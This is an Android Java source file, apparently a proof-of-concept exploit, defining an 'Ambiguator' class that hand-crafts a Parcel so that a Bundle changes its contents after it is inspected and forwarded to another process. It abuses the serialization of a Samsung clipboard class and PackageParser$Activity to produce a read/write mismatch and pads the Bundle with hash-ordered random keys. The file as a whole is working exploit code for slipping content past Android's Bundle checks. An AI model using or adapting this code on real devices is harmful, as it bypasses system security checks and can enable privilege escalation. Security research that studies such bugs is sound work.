package com.example.ambigousbundle14;

import android.os.Bundle;
import android.os.Parcel;
import android.text.TextUtils;

import java.util.Random;

/**
 * Class for producing bundles that change their content after inspecting and forwarding to other process
 */
public class Ambiguator {

    private static final int VAL_NULL = -1; // Copied from Parcel
    private static final int VAL_STRING = 0;
    private static final int VAL_INTEGER = 1;
    private static final int VAL_BUNDLE = 3;
    private static final int VAL_PARCELABLE = 4;
    private static final int VAL_PARCELABLEARRAY = 16;
    private static final int VAL_OBJECTARRAY = 17;
    private static final int VAL_INTARRAY = 18;
    private static final int VAL_LONGARRAY = 19;
    private static final int VAL_SERIALIZABLE = 21;

    private static final int BUNDLE_MAGIC = 0x4C444E42; // 'B' 'N' 'D' 'L', copied from BaseBundle
    private static final int BUNDLE_MAGIC_NATIVE = 0x4C444E44; // 'B' 'N' 'D' 'N'
    private static final int BUNDLE_SKIP = 12; // len(length, BUNDLE_MAGIC, N)

    public Bundle make(Bundle postReSerialize) throws Exception {
        // Find key that has hash below everything else
        Random random = new Random(1234);

        Parcel postBundleParcel = Parcel.obtain();
        postBundleParcel.writeBundle(postReSerialize);
        int postBundleSize = postBundleParcel.dataPosition() - BUNDLE_SKIP;

        // Write bundle
        Parcel parcel = Parcel.obtain();

        int bundleSizePosition = parcel.dataPosition();
        parcel.writeInt(0);
        parcel.writeInt(BUNDLE_MAGIC_NATIVE);
        int bundleStartPosition = parcel.dataPosition();

        parcel.writeInt(postReSerialize.size() + 2); // Num key-value pairs

        parcel.writeString("intent");
        parcel.writeInt(VAL_PARCELABLEARRAY);
        int valueSizePosition = parcel.dataPosition();
        parcel.writeInt(0);
        int valueStartPosition = parcel.dataPosition();
        parcel.writeInt(1); // Number of items in Parcelable[]
        parcel.writeString("com.samsung.android.content.clipboard.data.SemImageClipData");
        parcel.writeInt(2); // type tag
        parcel.writeInt(0); // mType
        parcel.writeLong(0); // mTimestamp
        parcel.writeValue(false); // mIsProtected
        parcel.writeLong(0); // mCallerUid
        parcel.writeParcelable(null, 0); // mClipData
        parcel.writeParcelable(null, 0); // mParcelFd
        parcel.writeString(null); // mClipId
        parcel.writeInt(0); // mMimeTypes.size()
        TextUtils.writeToParcel(null, parcel, 0); // mLabel
        parcel.writeInt(0); // mKeyList.size()
        parcel.writeInt(0); // mObjList.size()
        parcel.writePersistableBundle(null); // mBundle
        parcel.writeValue(false); // mIsPCClip
        parcel.writeValue(false); // mIsRemoteClip
        parcel.writeString(null); // mRemoteClipId
        parcel.writeInt(0); // mRemoteState
        parcel.writeString(null); // mImagePath
        parcel.writeString(null); // mContentUri
        parcel.writeString(null); // mInitBaseValue
        parcel.writeByte((byte) 0); // mInitBaseValueCheck
        parcel.writeString(null); // mExtraDataPath
        parcel.writeString("android.content.pm.PackageParser$Activity");
        parcel.writeString(null); // PackageParser$Component.className
        parcel.writeBundle(null); // PackageParser$Component.metaData
        parcel.writeInt(1);
        int valueDataSize = parcel.dataPosition() - valueStartPosition;
        parcel.writeString("android.os.PooledStringWriter");
        parcel.writeInt(VAL_PARCELABLE);
        parcel.writeInt(postBundleSize);
        parcel.appendFrom(postBundleParcel, BUNDLE_SKIP, postBundleSize);
        for (int i = 0; i < postReSerialize.size(); i++) {
            String s;
            do {
                s = randomString(random);
            } while (s.hashCode() <= "android.os.PooledStringWriter".hashCode());
            parcel.writeString(s);
            parcel.writeInt(VAL_NULL);
        }

        // Fix up bundle size
        int bundleDataSize = parcel.dataPosition() - bundleStartPosition;
        parcel.setDataPosition(bundleSizePosition);
        parcel.writeInt(bundleDataSize);
        parcel.setDataPosition(valueSizePosition);
        parcel.writeInt(valueDataSize);

        parcel.setDataPosition(0);
        Bundle bundle = parcel.readBundle();
        parcel.recycle();
        postBundleParcel.recycle();
        return bundle;
    }

    private String getStringEncodingInt(int i) {
        Parcel parcel = Parcel.obtain();
        parcel.writeInt(2);
        parcel.writeInt(i);
        parcel.writeInt(0);
        parcel.setDataPosition(0);
        String s = parcel.readString();
        parcel.recycle();
        return s;
    }

    private static void writeBundleSkippingHeaders(Parcel parcel, Bundle bundle) {
        Parcel p2 = Parcel.obtain();
        bundle.writeToParcel(p2, 0);
        parcel.appendFrom(p2, BUNDLE_SKIP, p2.dataPosition() - BUNDLE_SKIP);
        p2.recycle();
    }

    private static String randomString(Random random) {
        return randomString(random, 6);
    }

    private static String randomString(Random random, int len) {
        StringBuilder b = new StringBuilder();
        for (int i = 0; i < len; i++) {
            b.append((char)(' ' + random.nextInt('~' - ' ' + 1)));
        }
        return b.toString();
    }

    private static void padBundle(Bundle bundle, int size, int minHash, Random random) {
        while (bundle.size() < size) {
            String key;
            do {
                key = randomString(random);
            } while (key.hashCode() < minHash || bundle.containsKey(key));
            bundle.putString(key, "PADDING");
        }
    }
}
